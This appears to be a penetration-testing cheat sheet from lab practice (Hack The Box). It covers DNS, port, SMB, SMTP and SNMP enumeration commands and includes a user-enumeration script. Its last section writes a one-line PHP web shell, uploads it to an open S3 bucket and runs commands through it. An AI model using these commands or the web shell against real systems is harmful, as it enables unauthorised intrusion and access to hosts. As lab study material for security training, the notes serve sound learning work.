## **DNS Enumeration**

#### Custom
`for ip in $(cat list.txt); do host $ip.-host-.com; done`
#### Scan PTR records
`for ip in $(seq 200 254); do host -host-.$ip; done | grep -v "not found"`
#### Automated recon
`dnsrecon -d -host- -t std`
`dnsrecon -d -host- -D ~/list.txt -t brt`
`dnsenum`

### Sub-domains
`gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb --append-domain`

#### Windows
`nslookup`

## **TCP/UDP Enumeration**

### Netcat - interesting ports

###### TCP
`nc -nvv -w 1 -z <host> <port-port>`
###### UDP
`nc -nv -u -z -w 1 <host> <port-port>

### Nmap sweep scans

#### Standard:
`nmap -sn <host>
 Ping sweep:
`nmap -v -sn <host> -oG ping-sweep.txt`
`grep Up ping-sweep.txt | cut -d " " -f 2`
#### TCP/UDP:
`nmap -p <port> <host> -oG web-sweep.txt`
`grep open web-sweep.txt | cut -d" " -f2`
#### OS fingerprinting
`sudo nmap -O <host> --osscan-guess` --quiet
`nmap -sT -A <host> --aggressive

#### Windows:
`Test-NetConnection -Port 445 <host>`

## **SMB Enumeration**

`sudo nbtscan -r <network>/24`
`nmap -v -p 139,445 --script smb-os-discovery <host>`
#### Windows
`net view \\dc01 /all`

## **SMTP Enumeration**

#### Verify user
`nc -nv <host> 25`
#### Verify if a user exists on the server 
`python3 smtp_verify.py <user> <host>` 

```python
#!/usr/bin/python
# smtp_verify.py
import socket
import sys

if len(sys.argv) != 3:
    print("Usage: vrfy.py <username> <target_ip>")
    sys.exit(0)

# Create a Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Server
ip = sys.argv[2]
connect = s.connect((ip,25))

# Receive the banner
banner = s.recv(1024)
print(banner)

# VRFY a user
user = (sys.argv[1]).encode()
s.send(b'VRFY ' + user + b'\r\n')
result = s.recv(1024)

print(result)
# Close the socket
```
#### Windows
`Test-NetConnection -Port 25 <host>`
`dism /online /Enable-Feature /FeatureName:TelnetClient` --client install
`telnet <host> 25`

## **SNMP Enumeration**

`sudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt`

```bash
echo public > community
echo private >> community
echo manager >> community
for ip in $(seq 1 254); do echo <host>.$ip; done > ips
# Query MIB
onesixtyone -c community -i ips

<host> [public] Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT
COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)
# Query info
snmpwalk -c public -v1 -t 10 <host>
# Query users
snmpwalk -c public -v1 <host> 1.3.6.1.4.1.77.1.2.25
# Query Processes
snmpwalk -c public -v1 <host> 1.3.6.1.2.1.25.4.2.1.2
# Query installed software
snmpwalk -c public -v1 <host> 1.3.6.1.2.1.25.6.3.1.2
# Query TCP listening ports
snmpwalk -c public -v1 <host> 1.3.6.1.2.1.6.13.1.3
```

## AWS Enumeration S3
```
# Check Auth
aws --endpoint=http://<host> s3 ls
# List
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
# Make shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
# Upload
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

	`http://<host>/shell.php?cmd=id`
	
